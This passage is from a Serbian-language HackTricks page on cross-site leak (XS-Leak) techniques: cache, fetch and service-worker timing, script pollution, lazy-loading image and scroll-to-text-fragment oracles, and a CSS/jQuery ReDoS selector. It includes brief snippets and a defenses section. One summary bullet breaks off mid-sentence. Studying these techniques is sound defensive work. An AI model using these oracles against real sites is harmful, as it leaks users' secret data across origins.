(Komentar sa [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ako sajt `primer.com` uključuje resurs sa `*.primer.com/resource`, taj resurs će imati **isti ključ keširanja** kao da je resurs direktno **zahtevan putem navigacije na najvišem nivou**. To je zato što ključ keširanja čine _eTLD+1_ na najvišem nivou i _eTLD+1_ okvira.

Zbog toga što je pristup kešu brži od učitavanja resursa, moguće je pokušati promeniti lokaciju stranice i prekinuti je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon prekida, to znači da je resurs keširan.\
Ili se jednostavno **pošalje neki fetch za potencijalno keširanu stranicu i meri vreme koje je potrebno**.

### Ručno preusmeravanje <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Preusmeravanja
* **Više informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Rezime**: Moguće je saznati da li je odgovor na za
### Zagađivanje skripti

* **Metode uključivanja**: HTML elementi (script)
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Rezime**: Moguće je **prepisati ugrađene funkcije** i pročitati njihove argumente čak i iz **skripte sa različitog izvora** (koja se ne može direktno pročitati), što može **procuriti vredne informacije**.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Servisni radnici <a href="#service-workers" id="service-workers"></a>

* **Metode uključivanja**: Iskačući prozori
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Rezime**: Merenje vremena izvršavanja veba koristeći servisne radnike.
* **Primer koda**:

U datom scenariju, napadač preduzima inicijativu da registruje **servisni radnik** unutar jednog od svojih domena, tačnije "attacker.com". Zatim, napadač otvara novi prozor na ciljnom veb sajtu iz glavnog dokumenta i naređuje **servisnom radniku** da pokrene tajmer. Kako novi prozor počinje da se učitava, napadač navigira referencom dobijenom u prethodnom koraku do stranice kojom upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa statusnim kodom **204 (No Content)**, čime efektivno završava proces navigacije. U ovom trenutku, **servisni radnik** beleži merenje sa tajmera pokrenutog ranije u drugom koraku. Ovo merenje je uticano trajanjem JavaScript-a koji uzrokuje kašnjenja u procesu navigacije.

{% hint style="warning" %}
Pri merenju vremena izvršavanja je moguće **eliminisati** **mrežne faktore** kako bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.
{% endhint %}

### Vreme dohvata

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Rezime**: Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva. Mogu se koristiti i druge vrste tajmera.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Vreme preko prozora

* **Metode uključivanja**: Iskačući prozori
* **Detektoviva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Rezime**: Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva koristeći `window.open`. Mogu se koristiti i druge vrste tajmera.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sa HTML ili re injekcijom

Ovde možete pronaći tehnike za izvlačenje informacija iz HTML-a sa različitog izvora **ubacivanjem HTML sadržaja**. Ove tehnike su interesantne u slučajevima kada iz bilo kog razloga možete **ubaciti HTML, ali ne možete ubaciti JS kod**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Usporeno učitavanje slika

Ako trebate **izvući sadržaj** i možete **dodati HTML pre tajnog sadržaja**, trebali biste proveriti **uobičajene tehnike za dangling markup**.\
Međutim, ako iz bilo kog razloga **MORATE** to uraditi **po karakter po karakter** (možda je komunikacija putem keširanog pogotka), možete koristiti ovu prevaru.

**Slike** u HTML-u imaju atribut "**loading**" čija vrednost može biti "**lazy**". U tom slučaju, slika će se učitati kada bude prikazana, a ne tokom učitavanja stranice:
```html
<img src=/something loading=lazy >
```
Stoga, ono što možete uraditi je **dodati puno beskorisnih znakova** (Na primer, **hiljade "W"**) da **popunite web stranicu pre tajne ili dodate nešto poput** `<br><canvas height="1850px"></canvas><br>.`\
Zatim, ako na primer naša **injekcija se pojavi pre zastave**, slika će biti **učitana**, ali ako se pojavi **posle** zastave, zastava + beskorisni znakovi će **sprečiti njeno učitavanje** (morate eksperimentisati sa količinom beskorisnih znakova koje treba postaviti). To se desilo u [**ovom writeup-u**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

Međutim, možete **naterati robota da pristupi stranici** sa nečim poput
```
#:~:text=SECR
```
Dakle, web stranica će biti nešto poput: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrži napadačeve nevažne znakove i slike koje se učitavaju na zahtev, a zatim se dodaje tajna informacija o botu.

Ovaj tekst će omogućiti botu pristup bilo kom tekstu na stranici koji sadrži tekst `SECR`. Kako je taj tekst tajna i nalazi se **ispod slike**, slika će se **učitati samo ako je pogodjena tačna tajna**. Tako da imate svoj orakl za **ekstrakciju tajne po karakteru**.

Neki primer koda za iskorišćavanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Vreme učitavanja slike sa lenjim učitavanjem

Ako nije moguće učitati spoljnu sliku koja bi mogla da pokaže napadaču da je slika učitana, druga opcija bi bila da **pokušate da pogodite karakter nekoliko puta i izmerite to**. Ako se slika učita, svi zahtevi će trajati duže nego kada slika nije učitana. To je ono što je korišćeno u [**rešenju ovog opisa**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumirano ovde:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, moguće je saznati putem vremena da li neki HTML sadržaj postoji, to je zato što ako se selektor `main[id='site-main']` ne podudara, ne mora da proverava ostale **selektore**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Odbrane

Preporučene su mitigacije u [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) kao i u svakom odeljku wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo za više informacija o tome kako se zaštititi od ovih tehnika.

## Reference

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
